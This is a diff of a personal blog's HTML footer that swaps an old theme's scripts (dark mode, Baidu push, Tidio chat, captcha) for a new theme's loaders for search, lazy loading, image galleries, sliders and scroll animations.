-            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
-            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
-            
-            setTimeout(function () {
-            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
-                $(this).remove()
-            })
-            }, 2e3)
-        })
-    }
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    
-
-    
-    
-    
-        
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
-            }
-        </script>
-    
-
-    <!-- 雪花特效 -->
-    
-
-    <!-- 鼠标星星特效 -->
-    
-
-     
-        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
-        <script src="/libs/others/TencentCaptcha.js"></script>
-        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
-    
-
-    <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
         }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const slideUp = {
+      distance: `16px`,
+      duration: `800`,
+      interval: `100`,
+      scale: `1`,
+      opacity: 0,
+      easing: "ease-out"
+    };
+    ScrollReveal().reveal('.l_left .slide-up', slideUp);
+    ScrollReveal().reveal('.l_main .slide-up', slideUp);
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
 
-    
-        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
-        <script>
-            $(document).ready(function () {
-                setInterval(change_Tidio, 50);
-                function change_Tidio() {
-                    var tidio=$("#tidio-chat iframe");
-                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
-                        document.getElementById("tidio-chat-iframe").style.right="-15px";
-                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
-                        document.getElementById("tidio-chat-iframe").style.right="-15px";
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
-                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
-                    }
-                }
-            });
-        </script>
-    
 
-    
-
-    <!--腾讯兔小巢-->
-    
-    
-
-    
-
-    
-
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
-
-</body>
-
-</html>
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYDark.js"></script>
+</div></body></html>
